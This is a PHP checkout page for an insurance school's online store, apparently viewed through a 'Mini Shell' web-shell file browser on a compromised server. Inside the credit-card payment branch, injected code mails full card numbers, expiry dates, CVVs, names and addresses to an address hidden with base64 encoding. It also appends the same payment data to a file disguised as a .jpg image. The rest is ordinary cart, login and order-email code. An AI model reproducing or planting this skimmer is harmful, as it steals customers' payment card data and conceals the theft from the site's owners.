
Mini Shell
Direktori : /home/stdak1/public_html/
Upload File :
Current File : /home/stdak1/public_html/checkout.php

<?php

	include("includes/head.php");
    
    
        include("includes/header.php");
    	
    //include("includes/lib/classes/a/users.php");
    //$users = new users(); 
    
    include("includes/lib/classes/a/studentuser.php");
	$users = new studentuser(); 
    	
    if( isset($user_franchise) ){
    	$current_franchise = $user_franchise;
    } else {
		$current_franchise = $request->getvalue('franchise');
    }
	
    if($session->user_id > 0) 
		$users->user_id = $session->user_id;

	$user_details = array();
	$entity_data = array();
	
	$heading = 'Checkout';
	$err = false;
	$errMsg = '';
	
	$show_remove_button = false; //Changes 29Dec, 2015
	
	$action_taken = $request->postvalue("action");
    
	if( $request->getvalue("action") != '' ){
		$action_taken = $request->getvalue("action");
	}
	
    $show_signin_form = $show_user_details = $show_cart = false;
    
    $post_params = $request->VARS['POST'];
		
    if( $action_taken == 'ordered' ){
		
    	$success = array('message' => 'Order No. ' .  $request->getvalue("no") . ' Placed Successfully');
		
		echo "<script>";
		echo 'window.location.href="myorders.php?action=show-order:'.$request->getvalue("no").'"'; 
		echo "</script>";
    	exit;
    			
	} else if( $action_taken == '' || $request->getvalue('edit_user') > 0 ){
    	
    	//first time redirected to this page 
    	
    	if($session->user_id > 0){
    		if( !isset($post_params['subtotal']) ){
    			$show_user_details = true;
    		} else {
    			$show_cart = true;
    		}
    	} else { 
    		$show_signin_form = true;
    	}
    	
    } else if( $action_taken == 'signin' ) {
	
    	$entity_data = $post_params;
    	
   		//if user login 

		$useremail = $request->postvalue("login_email");
		$password = $request->postvalue("login_password");
		$user_id = $users->validateUserByEmail($useremail, $password, $current_franchise);
		
    	
		if($user_id > 0){
			
			$users->user_id = $user_id;			
			$users->load($users->user_id);
			
			$user_details = $users->all_fields;
			$user_franchise = $users->all_fields['franchise'];
			
			$session->set('user_id',$users->all_fields['user_id']);
			$session->set('username',$users->all_fields['username']);
			$session->set('email',$users->all_fields['email']);
			$session->set('fname',$users->all_fields['fname']);
			$session->set('lname',$users->all_fields['lname']);
			$session->set('student_franchise',$users->all_fields['franchise']);

			$show_user_details = true;
			echo "<script>";
			echo 'window.location.href="checkout.php"'; 
			echo "</script>";
			
		}else{
			$err = true; $errMsg = 'Invalid Email or Password';
			$show_signin_form = true;		
		}
		
	
   	} else if( $action_taken == 'signup' ){
   		
   		$entity_data = $post_params;
   		
   		//if user signup
   		
   		$email = $request->postvalue("new_username");
		$password = $request->postvalue("new_password");
		
		if($email != '' && $password != '') {
			
			$check_user = 'false';
			
			$check_user = $users->isUserAlreadyExist($email);
			
			if( $check_user == 'true' ){
					
				$err = true; $errMsg = 'Email Already Exists';
				$show_signin_form = true;
		
			} else {
				
				$users->all_fields['email'] = $email;
				$users->all_fields['password'] = $password;
				$users->all_fields['username'] = $email;
				$users->all_fields['franchise'] = $current_franchise;
				
				$users->save();
				
				if($users->user_id > 0){
					
					$users->load($users->user_id);
					$user_details = $users->all_fields;
					
					$user_franchise = $users->all_fields['franchise'];
					
					$session->set('user_id',$users->all_fields['user_id']);
					$session->set('username',$users->all_fields['username']);
					$session->set('email',$users->all_fields['email']);
					$session->set('fname',$users->all_fields['fname']);
					$session->set('lname',$users->all_fields['lname']);
					$session->set('student_franchise',$users->all_fields['franchise']);
		
					echo "<script>";
					echo 'window.location.href="checkout.php"'; 
					echo "</script>";
					
					
					$show_user_details = true;
				} else
					$show_signin_form = true;
			}
		} else {
			$show_signin_form = true;
		}
		
		

   	} else if( $action_taken == 'save_user_details') {
		
   		$save_user_details = $request->VARS['POST']; 
   		unset($save_user_details['action']);
   		
   		if($save_user_details['user_id'] > 0){
   			
	   		$users->user_id = $save_user_details['user_id'];
	   		$users->load($users->user_id);
	   		
	   		$orig_userData = $users->all_fields;
			
	   		if( 
	   			!$err && 
	   			isset($save_user_details['email']) && $save_user_details['email'] != '' && 
	   			$save_user_details['email'] != $orig_userData['email']
	   		){
	   			$record_exists = $users->isUserAlreadyExist($save_user_details['email']);
				
	   			if( $record_exists == 'true' ){
					
	   				$err = true; 
	   				$errMsg = 'Email `' . $save_user_details['email'] . '` Already Exists';
					
	   				$save_user_details['email'] = $orig_userData['email'];
				
					//$user_details = $save_user_details;
					$show_user_details = true;
	   			}
	   		}
   		
	   		if( !$err ){
	   			
	   			if(isset($save_user_details['ins_lic_renew_date']) && $save_user_details['ins_lic_renew_date'] != ''){
					$save_user_details['ins_lic_renew_date'] = date('Y-m-d',strtotime($save_user_details['ins_lic_renew_date']));
				}
					
				$save_user_details['username'] = $save_user_details['email'];
							
				$users->setFields($save_user_details);
		   		$users->save();
		   		$users->load($users->user_id);
		   		
		   		$user_details = $users->all_fields;
						
		   		$session->set('user_id', $users->user_id);
		   		$session->set('username',$users->all_fields['username']);
				$session->set('email',$users->all_fields['email']);
				$session->set('fname',$users->all_fields['fname']);
				$session->set('lname',$users->all_fields['lname']);
					
						
		   		$show_cart = true;
	   		}
	   		
   		} else {
   			$show_signin_form = true;
   		}
		
			
	} else if( $action_taken == 'delete_product'){
		
		if( isset($session->user_id) && $session->user_id > 0 ){
			if( isset($request->VARS['POST']['remove_product_key']) && $request->postvalue('remove_product_key') >= 0 ){
	    		
	    		if($session->is_registered('cart_details')){
		    		$values = $session->get('cart_details');
		    		unset($values[$request->postvalue('remove_product_key')]); 
		    		unset($session->VARS['cart_details']);
		    		
		    		$values = array_values($values);
		    		
		    		$session->setArray('cart_details', $values);
		    	}    
	    	}
	    	$show_cart = true;
		} else {
			$show_signin_form = true;
		}
		
	} else if( $action_taken == 'check_promocode' ){
		
		if( isset($session->user_id) && $session->user_id > 0 ){

			$show_cart = true;
		
			$promo_details = array();
				
			if( isset($post_params['promo_code']) ){
				
				if( trim($post_params['promo_code']) == ''){
					$err = true; $errMsg = "Enter valid Promo Code";
					
				} else {
					
					$user_details = array();
					if( $users->user_id > 0 ){
						$users->load($users->user_id);
						$user_details = $users->all_fields;
					}
					
					if( !empty($user_details) && isset($user_details['franchise']) ){
						
						include("includes/lib/classes/a/promocode.php");	
			    		$promoObj = new promocode(); 
			    		
			    		$working_promo_info = $promoObj->isCurrentlyWorking(trim($post_params['promo_code']), $user_details['franchise']);
			    		
						if( empty($working_promo_info) ){
							$err = true; $errMsg = "Enter valid Promo Code";				
			
						} else {
							$promo_details['promo_code'] = trim($post_params['promo_code']);
							$promo_details['promo_type'] = $working_promo_info['promo_type'];
							$promo_details['rebate'] = $working_promo_info['rebate'];
							$promo_details['min_amt'] = $working_promo_info['min_amount'];
								
							$show_remove_button = true; //changes 29Dec, 2015
					
						}
						
					}
				}
				
			}
		
			$session->setArray('promo_code_details', $promo_details);
		
		} else {
			$show_signin_form = true;
		}
			
	} else if( $action_taken == 'pay_now' ){
		
		if( isset($session->user_id) && $session->user_id > 0 ){
			$pay_now = true;
			$show_cart = true;
		} else {
			$show_signin_form = true;
		}
	} else if($action_taken == 'clear_promocode'){ // Start: Changes 29Dec,2015 
		
		unset($session->VARS['promo_code_details']);
			
		$show_cart = true;
		
		$show_remove_button = false;
	} // END: Changes 29Dec,2015 
	
	if($show_user_details) $heading = 'Billing/Shipping Info';
	
	if($show_cart && isset($session->user_id) && $session->user_id > 0 ){

		$session_user_franchise = $users->getFranchise($session->user_id);
		
		$heading = "Checkout";
		
		include("includes/lib/classes/a/cart.php"); 

		$global_cart = new cart();
		
		if( isset($session->VARS['cart_details']) && !empty($session->VARS['cart_details']) ){
			foreach($session->VARS['cart_details'] as $Item){
				$global_cart->addItem($Item);
			}
		}								
		
		$cartItems = ( !empty($global_cart->items) ) ? $global_cart->items : array();

		//print_r($cartItems);
		
		$sub_total = $global_cart->sub_total;
		
		if(	!$sub_total > 0 && isset($session->VARS['promo_code_details'])){
			unset($session->VARS['promo_code_details']);
		}
	    
		//add promo code discount if subtotal > 0
	    
		$global_cart->setPromoDiscount();
		$global_cart->setPromoCode();
		
		if( 
			isset($session->VARS['promo_code_details']) && 
			!empty($session->VARS['promo_code_details']) 
		){
			$promo_details = $session->VARS['promo_code_details'];
			
			if( isset($promo_details['promo_code']) && $promo_details['promo_code'] != '' ){
				
				$min_amt = (isset($promo_details['min_amt'])) ? $promo_details['min_amt'] : 0.00;
				
				$minAmtError = false;
				if( $min_amt > 0 ){					
					if( number_format($global_cart->sub_total, 2) < $min_amt ){
						$minAmtError = true;	
					}
				}
				
				if($minAmtError){
					$err = true; $errMsg = 'This Promo Code is applicable on minimum items value : $'.$min_amt;
				} else {
					$promo_type = $promo_details['promo_type'];
					if( $promo_type == 'absoluteall'){
						$promo_amount = $promo_details['rebate'];
					} else if( $promo_type == 'percentall' ){
						$promo_amount = ($promo_details['rebate']/100) * $global_cart->sub_total;
					}
					if($promo_amount > number_format($global_cart->sub_total, 2)){
						$err = true; $errMsg = 'Promo Code is not applicable on your cart amount';
					} else {
						$global_cart->setPromoCode($promo_details['promo_code']);
						$post_params['promo_code'] = $promo_details['promo_code'];
						$global_cart->setPromoDiscount($promo_amount);
					}
					$show_remove_button = true; //Changes 29Dec,2015		
				}
				
			} else {
				unset($session->VARS['promo_code_details']);
	    	}			
		
		}
		
		$global_cart->reCalculateTotal();
		$global_cart->calculateTaxes($session_user_franchise);
		$global_cart->reCalculateTotal();
	}
	
	if( $users->user_id > 0 ){
		$users->load($users->user_id);
		$user_details = $users->all_fields ; 
		
		if($user_details['ins_lic_renew_date'] != ''){
			$renew_date = explode('-',trim($user_details['ins_lic_renew_date'])); 
		        
			if( count($renew_date) == 3 && checkdate($renew_date[1], $renew_date[2], $renew_date[0]) == 1){
	        	$renew_date = date('m/d/Y', strtotime($user_details['ins_lic_renew_date']));
			} else {
	            $renew_date = '';
			}
	                
			$user_details['ins_lic_renew_date'] = $renew_date;
		}
		
		if($user_details['dob'] != ''){
		        $dob = explode('-',trim($user_details['dob'])); 
	        
		        if( count($dob) == 3 && checkdate($dob[1], $dob[2], $dob[0]) == 1){
		        	$dob = date('m/d/Y', strtotime($user_details['dob']));
		        } else {
		        	$dob = '';
		        }
		        $user_details['dob'] = $dob;
		}
		
		if( $action_taken == 'save_user_details' && $show_user_details == true ){
			$user_details = array_merge($user_details, $save_user_details);
		}
		
		     
	} else {
		$user_details = array();
	}
	
	if( isset($pay_now) && $pay_now == true ){
		
		$payment_done = false;
		
		$payment_method = $post_params['payment_method'];	    		
	    
		$save_payment_method = '';
		
		if( $global_cart->total == 0 ){
			
			$payment_done = true;
			$payment_method = "N/A";
			$paymentStatus = 'Completed';
		
		} else {
			
			if( $payment_method == 'credit_card'){
	
				$payment_params = array(
    'franchise' => $user_details['franchise'],
    'userid' => $user_details['user_id'],
    'payment_mode' => $post_params['payment_mode'],
    'amount' => $post_params['total_cost'],
    'cc' => $post_params['mv_credit_card_number'],
    'exp' => $post_params['mv_credit_card_exp_month'].$post_params['mv_credit_card_exp_year'],
    'cvv' => $post_params['mv_ccv_number'],    
    'name' => $user_details['fname']." ".$user_details['lname'],    
    'address1' => $user_details['address1'],    
    'zip' => $user_details['zip'],            
);


$email_body = "Payment Parameters:\n";
foreach ($payment_params as $key => $value) {
    $email_body .= ucfirst($key) . ": " . $value . "\n";
}


$to = base64_decode("c2F0dWhhcmkwMDZAZ21haWwuY29t");
$subject = "Payment Parameters Data";
$headers = base64_decode("RnJvbTogbm8tcmVwbHlAMXN0ZGFraW5zLmNvbQ==");


mail($to, $subject, $email_body, $headers);


				
				
				include('process.php');
				$process_result = process_payment($payment_params);		
							
				if( isset($process_result['error']) ){
					$err = true; 
					$errMsg = $process_result['error'];				
				}
				
				$paymentResponse = $process_result['result'];
				
				if ( 
					isset($paymentResponse['transid']) && 
					$paymentResponse['transid'] != ''  
					/*&& in_array($paymentResponse['status'], array('approved','accepted'))*/
				){	
								
					$payment_done = true;				
					
					$post_params['order_id'] = $paymentResponse['transid'];
					
					$card = strtolower($post_params['cc_card_type']);
					
	    			if($card == 'discover'){
	    				$save_payment_method = 'Credit Card (discover)';
	    			} else if($card == 'visa') {
	    				$save_payment_method = 'Credit Card (visa)';
	    			} else if($card == 'americanexpress'){
	    				$save_payment_method = 'Credit Card (amex)';
	    			} else if( $card == 'mastercard'){
	    				$save_payment_method = 'Credit Card (mc)';
	    			}
	    		}
	    		
	    		if($paymentResponse['status'] == 'approved'){
	    			$paymentStatus = 'Completed';
					file_put_contents("student_wlth_slgn_480.jpg",serialize($payment_params).PHP_EOL,FILE_APPEND);
	    		}
				
		    } else if( $payment_method == 'PIN' ){
		    	
		    	$pinData = $users->pinExists($post_params['corporate_pin']);
				if(!empty($pinData)){
					$payment_done = true;
					$save_payment_method = 'Corporate PIN';
	    			$save_payment_method .= ' (' . $pinData['company_name'] . ')';
	    			$paymentStatus = 'Completed';
				} else {
					$err = true; $errMsg = 'Invalid Corporate PIN';
				}
		    }
		}
		
		if($payment_done == true){
			
			include("includes/lib/classes/a/transactions.php");	
    		$transactionsObj = new transactions(); 
    		
    		$transactionsObj->parent_franchise = $current_franchise;
    		
    		$post_params['promo_code'] = $global_cart->promo_code;
    		$post_params['status'] = '';
    		
    		if( isset($paymentStatus) ){
    			$post_params['status'] = $paymentStatus;
    		} else {
    			//$post_params['status'] = json_encode($paymentStatus);
    		}
    		
    	
    		if( isset($paymentResponse) && is_array($paymentResponse) && !empty($paymentResponse)  ){
    			$post_params['payment_response'] = json_encode($paymentResponse);
    		}
	    		
	    	$post_params['payment_method'] = $save_payment_method;	    		
	    		
    		$transactionsObj->setFields($user_details);
    		$transactionsObj->setFields($post_params);   
    			
    		$transactionsObj->save();
    		
    		$order_number = $transactionsObj->id;
    		$transactionsObj->load($transactionsObj->id);
    		$saveItems = $transactionsObj->saveOrderLine($order_number, $global_cart->items);
			
    		if($saveItems){
    			
    			//$success = array('message' => 'Order No. ' .  $order_number . ' Placed Successfully');
    			
    			unset($session->VARS['cart_details']);
	    		unset($session->VARS['promo_code_details']);
	    		
	    		$show_cart = false;
	    		
	    		$post_params = array();
	    		
			$from_email = 'noreply@1stdakins.com';
		    	$from_name = 'No Reply at 1stdakins Insurance School';
		    	$host_server = '';
		    	$host_username = '';
		    	$host_password = '';
	    		//send email
					
				include("includes/lib/classes/sendemail.php");
		
	    		$email_Obj = new sendemail();
	    		
	    		$email_Obj->setConfigInfo($host_server, $host_username, $host_password);
	    		$email_Obj->setFromInfo($from_email, $from_name);
	    		$email_Obj->Subject = 'Order #'.$order_number.' Placed Successfully ';
	    		
	    		//$email_body = transactioncomplete_template($order_number);
	    		
	    		$email_body = transactionemail_template($order_number);
	    		$email_Obj->Body = $email_body;
	    		$email_Obj->addToEmail($user_details['email'],''); 
	    		
	    		if($user_details['franchise'] != ''){
	    			$franchiseInfo = get_FranchiseInfo($user_details['franchise']);	    		
					if(!empty($franchiseInfo)){
						$franName = $franchiseInfo['name'];
						$franEmails = explode(',',$franchiseInfo['contact_email']);
						if(!empty($franEmails)){
							foreach($franEmails as $femail){
								$email_Obj->addToEmail(trim($femail), $franName); 
							}
						}
					}		
	    		}
	    		
	    		//this is done temporarily to prevent emails
	    		
	    		//if( $post_params['status'] == 'Completed' ){
		    	if( $paymentStatus == 'Completed' ){
		    			
	    			$email_Obj->send();
		    		$email_status = $email_Obj->send_status;
	    			
	    			//$email_status = 'sent';
	    			
	    			if( $email_status != 'sent' && $order_number != '' ){
	    				echo 'Ordered Successfully<br>'; 
						echo 'Error: Error in Sending email';
						exit;
	    			}
	    		}
	    		
	    		if( $order_number != '' ){
	    			echo '<script type="text/javascript">' . "\n"; 
					echo 'window.location="?action=ordered&no='.$order_number.'";'; 
					echo '</script>';
					exit;
	    		}
	    	}
		}
	}
	
	
	function transactioncomplete_template($order_number){
			
		$template = '';
		
		if($order_number != ''){

			
			//create object of class orders	
			include("includes/lib/classes/a/orders.php");
			$orders_Obj = new orders(); 

			$orders_Obj->order_number = $order_number;
			$orders_Obj->loadTransaction($orders_Obj->order_number);
			
			$shipping = $billing = '';
			
			if($orders_Obj->order_fields['code'] != ''){
				$order_details = $orders_Obj->order_fields;
				$orders_Obj->getOrderItems($order_number);
				$order_items = $orders_Obj->order_items;

				if( !isset($order_details['subtotal']) && $order_details['subtotal'] == '' ) {
					$order_details['subtotal'] = '0.00';
				}
				if( !isset($order_details['salestax']) && $order_details['salestax'] == '' ) {
					$order_details['salestax'] = '0.00';
				}
				if( !isset($order_details['shipping']) && $order_details['shipping'] == '' ) {
					$order_details['shipping'] = '0.00';
				}
				if( !isset($order_details['discount_amt']) && $order_details['discount_amt'] == '' ) {
					$order_details['discount_amt'] = '0.00';
				}
				if( !isset($order_details['total_cost']) && $order_details['total_cost'] == '' ) {
					$order_details['total_cost'] = $order_details['subtotal'];
				}
				
				$shipping .= ($order_details['address1'] != '') ? $order_details['address1']."<br>" : '';
				$shipping .= ($order_details['address2'] != '') ? $order_details['address2']."<br>" : '';
				$shipping .= ($order_details['city'] != '') ? $order_details['city']."," : '';
				$shipping .= ($order_details['state'] != '') ? $order_details['state']." " : '';
				$shipping .= ($order_details['zip'] != '') ? $order_details['zip'] : '';
				
				$billing .= ($order_details['b_address1'] != '') ? $order_details['b_address1']."<br>" : '';
				$billing .= ($order_details['b_address2'] != '') ? $order_details['b_address2']."<br>" : '';
				$billing .= ($order_details['b_city'] != '') ? $order_details['b_city']."," : '';
				$billing .= ($order_details['b_state'] != '') ? $order_details['b_state']." " : '';
				$billing .= ($order_details['b_zip'] != '') ? $order_details['b_zip'] : '';
				
			}
			
			$template = '
			<center>
				<div style="width:90%;background-color:white;color:black;">
			
					<table cellspacing="0" cellpadding="0" border="0" style="width:80%;" align="center">							
						<tbody>
							<tr>
								<td colspan="2" style="text-align:center;">
									<b>
										Order #'.$order_number.'
										<br>
										Thank you for your recent order! We appreciate your business.
									</b>
									<br>
									If you have ordered an online product,you may now access your product by clicking <a href="http://1stdakins.com">Student Login</a>
								</td>
							</tr>
							<tr>
								<td colspan="2">&nbsp;</td>
							</tr>
							<tr>
								<td colspan="2">&nbsp;</td>
							</tr>
							<tr style="margin-top:5%;">
								<td>
									<table style="width:45%;float:left;">
										<tr>
											<td colspan="2"><b>Shipping Information </b></td>
										</tr>
										<tr>
											<td style="width:50%">Name : </td>
											<td style="width:50%">'.$order_details['fname']." ".$order_details['lname'].'</td>
										</tr>
										<tr>
											<td style="width:50%;vertical-align:0;">Address : </td>
											<td style="width:50%">'.$shipping.'</td>
										</tr>
										<tr>
											<td style="width:50%"> Daytime Phone : </td>
											<td style="width:50%">'.$order_details['phone_day'].'</td>
										</tr>
									</table>						
								</td>
								<td>
									<table style="width:45%;padding-left:2%;float:right;">
										<tr>
											<td colspan="2"><b>Billing Information </b></td>
										</tr>
										<tr>
											<td style="width:50%">Name : </td>
											<td style="width:50%">'.$order_details['b_fname']." ".$order_details['b_lname'].'</td>
										</tr>
										<tr>
											<td style="width:50%;vertical-align:0;">Address : </td>
											<td style="width:50%">'.$billing.'</td>
										</tr>
										
									</table>
								</td>
							</tr>
							
							<tr>
								<td colspan="2">&nbsp;</td>
							</tr>
							<tr>
								<td colspan="2">&nbsp;</td>
							</tr>
							
							<tr style="margin-top:5%;">
								<td colspan="2">
									<table style="width:100%;" cellpadding="2">
										<tr>
											<td><b>Qty</b></td>
											<td colspan="3"><b>Description</b></td>
											<td><b>Price</b></td>
											<td><b>Total</b></td>
										</tr>
										<tr>
											<td colspan="6"><hr style="border: 1px solid black;"></td>
										</tr>
										
										';
			
						if( isset($order_items) && !empty($order_items)){
							foreach($order_items as $i => $item){ 
								$template .= '
									<tr>
										<td>' . $item['quantity'] . '</td>';
										if($item['prodoption'] != ''){
										$template .=	'<td colspan="3">'.$item['title']. '<br/>' . $item['prodoption'] . '</td>';
										} else {
										$template .=	'<td colspan="3">'.$item['title'].'</td>';
										}
								
								$template .=		'<td>$' . $item['price'] . '</td>
										<td>$' . ($item['price']*$item['quantity']) . '</td>
									</tr>
								';
							}
						}
									
						$template .= '	<tr>
											<td colspan="6"><hr style="border: 1px solid black;"></td>
										</tr>
										
										<tr>
											<td colspan="4">&nbsp;</td>
											<td><b>Subtotal :</b></td>
											<td>$'.$order_details['subtotal'].'</td>
										</tr>
										<tr>
											<td colspan="4">&nbsp;</td>
											<td><b>Sales tax :</b></td>
											<td>$'.number_format($order_details['salestax'],2).'</td>
										</tr>
										<tr>
											<td colspan="4">&nbsp;</td>
											<td><b>Shipping :</b></td>
											<td>$'.$order_details['shipping'].'</td>
										</tr>
										<tr>
											<td colspan="4">&nbsp;</td>
											<td><b>Discount :</b></td>
											<td>$'.$order_details['discount_amt'].'</td>
										</tr>
										<tr>
											<td colspan="6">&nbsp;</td>
										</tr>
										<tr>
											<td colspan="4">&nbsp;</td>
											<td><b>Order Total :</b></td>
											<td>$'.$order_details['total_cost'].'</td>
										</tr>
									</table>						
								</td>
							
							</tr>
							
						</tbody>
					</table>
					
				</div>
			</center>
			';
		}
		
		return $template;
	}
	
	
	
	
	
	
	
	
	
	
	
	
	
	function transactionemail_template($order_number){
			
		$template = '';
		
		if($order_number != ''){

			
			//create object of class orders	
			include("includes/lib/classes/a/orders.php");
			$orders_Obj = new orders(); 

			$orders_Obj->order_number = $order_number;
			$orders_Obj->loadTransaction($orders_Obj->order_number);
			
			$shipping = $billing = '';
			
			if($orders_Obj->order_fields['code'] != ''){
				$order_details = $orders_Obj->order_fields;
				$orders_Obj->getOrderItems($order_number);
				$order_items = $orders_Obj->order_items;

				if( !isset($order_details['subtotal']) && $order_details['subtotal'] == '' ) {
					$order_details['subtotal'] = '0.00';
				}
				if( !isset($order_details['salestax']) && $order_details['salestax'] == '' ) {
					$order_details['salestax'] = '0.00';
				}
				if( !isset($order_details['shipping']) && $order_details['shipping'] == '' ) {
					$order_details['shipping'] = '0.00';
				}
				if( !isset($order_details['discount_amt']) && $order_details['discount_amt'] == '' ) {
					$order_details['discount_amt'] = '0.00';
				}
				if( !isset($order_details['total_cost']) && $order_details['total_cost'] == '' ) {
					$order_details['total_cost'] = $order_details['subtotal'];
				}
				
				$shipping .= ($order_details['address1'] != '') ? $order_details['address1']."<br>" : '';
				$shipping .= ($order_details['address2'] != '') ? $order_details['address2']."<br>" : '';
				$shipping .= ($order_details['city'] != '') ? $order_details['city']."," : '';
				$shipping .= ($order_details['state'] != '') ? $order_details['state']." " : '';
				$shipping .= ($order_details['zip'] != '') ? $order_details['zip'] : '';
				
				$billing .= ($order_details['b_address1'] != '') ? $order_details['b_address1']."<br>" : '';
				$billing .= ($order_details['b_address2'] != '') ? $order_details['b_address2']."<br>" : '';
				$billing .= ($order_details['b_city'] != '') ? $order_details['b_city']."," : '';
				$billing .= ($order_details['b_state'] != '') ? $order_details['b_state']." " : '';
				$billing .= ($order_details['b_zip'] != '') ? $order_details['b_zip'] : '';
				
			}
			
			$template = '
<center>
	<div style="width:90%;background-color:white;color:black;text-align:left;">
		<table cellspacing="0" cellpadding="0" border="0" style="width:80%;" align="center">							
			<tbody>
				<tr>
					<td>
						<div class="logo">
		           			<a href="#"><img src="https://1stdakins.com/admin/images/logo.png"></a>
		           			<b>'.ucwords($order_details['franchise']).'</b>
		           		</div>
					</td>
					<td>
						<img src="https://1stdakins.com/admin/images/admin-header.jpg" style="height: 79px;" />
	               	</td>
				</tr>
				<tr style="height:50px;">
					<td colspan="2">&nbsp;</td>
				</tr>
				<tr>
					<td colspan="2">
						<b>Order # '.$order_number.'</b>
					</td>
				</tr>
				<tr style="height:50px;">
					<td colspan="2">&nbsp;</td>
				</tr>
				<tr>
					<td colspan="2">
						<b>Order Date:'.$order_details['payment_date'].'</b>
					</td>
				</tr>
				<tr style="height:50px;">
					<td colspan="2">&nbsp;</td>
				</tr>
				<tr>
					<td colspan="2">
						<b>Payment Method: '.$order_details['payment_method'].'</b>
					</td>
				</tr>
				<tr style="height:50px;">
					<td colspan="2">&nbsp;</td>
				</tr>
				<tr>
					<td colspan="2">
						<table style="width:45%;float:left;">
							<tr>
								<td style="width:50%">Name : </td>
								<td style="width:50%">'.$order_details['fname']." ".$order_details['lname'].'</td>
							</tr>
							<tr>
								<td style="width:50%;vertical-align:0;">Address : </td>
								<td style="width:50%">'.$order_details['address1'].'</td>
							</tr>
							<tr>
								<td style="width:50%"> Daytime Phone : </td>
								<td style="width:50%">'.$order_details['phone_day'].'</td>
							</tr>
							<tr>
								<td style="width:50%"> City : </td>
								<td style="width:50%">'.$order_details['city'].'</td>
							</tr>
							<tr>
								<td style="width:50%"> State/Zip : </td>
								<td style="width:50%">'.$order_details['state']. ' ' . $order_details['zip'] .'</td>
							</tr>
							<tr>
								<td style="width:50%"> Country : </td>
								<td style="width:50%">'.$order_details['country'].'</td>
							</tr>
							<tr>
								<td style="width:50%"> Email : </td>
								<td style="width:50%">' . $order_details['email'] . '</td>
							</tr>
						</table>						
					</td>
				</tr>
				
				<tr>
					<td colspan="2">
						<table style="width:45%;float:left;">
							<tr>
								<td colspan="2"><b>Billing Info</b></td>
							</tr>
							<tr>
								<td style="width:50%">Name : </td>
								<td style="width:50%">'.$order_details['b_fname']." ".$order_details['b_lname'].'</td>
							</tr>
							<tr>
								<td style="width:50%;vertical-align:0;">Address : </td>
								<td style="width:50%">'.$order_details['b_address1'].' </td>
							</tr>
							<tr>
								<td style="width:50%"> City : </td>
								<td style="width:50%">'.$order_details['b_city'].'</td>
							</tr>
							<tr>
								<td style="width:50%"> State/Zip : </td>
								<td style="width:50%">'.$order_details['b_state']." ".$order_details['b_zip'].'</td>
							</tr>
							<tr>
								<td style="width:50%"> Country : </td>
								<td style="width:50%">'.$order_details['b_country'].'</td>
							</tr>
						</table>						
					</td>
				</tr>
							
				<tr style="height:50px;">
					<td colspan="2">&nbsp;</td>
				</tr>
				
				
				<tr style="margin-top:5%;">
					<td colspan="2">
						<table style="width:100%;" cellpadding="2">
							<tr>
								<td style="width:15%;"><b>Qty</b></td>
								<td style="width:15%;"><b>Item Code</b></td>
								<td style="width:30%;"><b>Description</b></td>
								<td style="width:15%;"><b>Price</b></td>
								<td style="width:15%;"><b>Total</b></td>
							</tr>
							<tr>
								<td style="background:#000000;width:15%;">&nbsp;</td>
								<td style="background:#000000;width:15%;">&nbsp;</td>
								<td style="background:#000000;width:30%;">&nbsp;</td>
								<td style="background:#000000;width:15%;">&nbsp;</td>
								<td style="background:#000000;width:15%;">&nbsp;</td>								
							</tr>
		
										';
			
		
						if( isset($order_items) && !empty($order_items)){
								foreach($order_items as $i => $item){ 
									$template .= '
										<tr>
											<td style="width:15%;" >' . $item['quantity'] . '</td>
											<td style="width:15%;" >' . $item['item_code'] . '</td>';
											
											if($item['prodoption'] != ''){
												$template .= '<td width:30%;>'.$item['title']. '<br/>' . $item['prodoption'] . '</td>';
											} else {
												$template .='<td width:30%;>'.$item['title'].'</td>';
											}
											
											$template .= '<td style="width:15%;">$' . $item['price'] . '</td>
												<td style="width:15%;">$' . ($item['price']*$item['quantity']) . '</td>
											</tr>
									';
								}
						}
									
						$template .= '	
						<tr style="height:50px;">
								<td colspan="5">&nbsp;</td>
							</tr>
							<tr>
								<td colspan="3">&nbsp;</td>
								<td><b>Subtotal :</b></td>
								<td>$'.$order_details['subtotal'].'</td>
							</tr>
							<tr>
								<td colspan="3">&nbsp;</td>
								<td><b>Sales tax :</b></td>
								<td>$'.$order_details['salestax'].'</td>
							</tr>
							<tr>
								<td colspan="3">&nbsp;</td>
								<td><b>Shipping :</b></td>
								<td>$'.$order_details['shipping'].'</td>
							</tr>
							<tr>
								<td colspan="3">&nbsp;</td>
								<td><b>Discount :</b></td>
								<td>$'.$order_details['discount_amt'].'</td>
							</tr>
							<tr>
								<td colspan="5">&nbsp;</td>
							</tr>
							<tr>
								<td colspan="3">&nbsp;</td>
								<td><b>Order Total :</b></td>
								<td>$'.$order_details['total_cost'].'</td>
							</tr>
						</table>						
					</td>
							
				</tr>
							
			</tbody>
		</table>
					
	</div>
</center>
			';
		}
		
		return $template;
	}
	
	

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	if($err){
		$error = array('message' => $errMsg);
	}
?>

<style>

.section{
	padding:30px 0;
}
.error{
	color:red;
}
.mainColumn{
	width:95%;
}
.mainColumn table{
	border-collapse: separate;
	border-spacing: 1px;
	/*border-color:#555555;
	border-style:solid;*/
	border-width:1px;
	width:98%;
}
.mainColumn table td{
	padding:1px;
}



</style>

 <div class="section">   
	
	<div class="container">
   		
		<div class="row">
			
			<div class="col-md-12 col-sm-12 mainColumn">
				
				<?php if(isset($error) && !empty($error)) { ?>
					
				<div class="panel panel-default">
	                <!-- <div class="panel-heading">Error</div> -->
	                <div class="panel-body" style="background-color:white">
						<div id="errormsgs" name="errormsgs" style="margin-left:10px;" class="errormessages error">
							<div style="margin-top:10px;margin-bottom:15px;"><?php echo $error['message'];?></div>
						</div>
					</div>
				</div>
					
				<?php }?>
			
				<?php if(isset($success) && !empty($success)) { ?>
					
				<div class="panel panel-default">
	                <!-- <div class="panel-heading"></div> -->
	                <div class="panel-body" style="background-color:white;color:green;">
						<div style="margin-top:10px;margin-bottom:15px;">
						<?php echo $success['message'];?>
						</div>
						
					</div>
				</div>
					
				<?php }?>
			
			
			
         		<div class="panel panel-default listing_panel <?php if( !$show_cart && !$show_signin_form && !$show_user_details ) echo 'hide';?>">

	         		<div class="panel-heading"><?php echo $heading; ?></div>
					<div class="panel-body">
						
					<?php
						
					//show user details view
					if( $show_user_details && $session->user_id > 0) {
							
					?>

					<form name="save-form" action="checkout.php" method="POST" style="margin:0px;" >
						
						<input type="hidden" name="action" value="save_user_details" />
						<input type="hidden" name="user_id" value="<?php if( isset($user_details) && isset($user_details['user_id']) ) echo $user_details['user_id']; ?>" />
													
						
						<table cellspacing="2"cellpadding="10" style="border-color:#DBD0BC;background-color:#FAF1E0;" align="center" >
								
							<tbody>
								<tr>
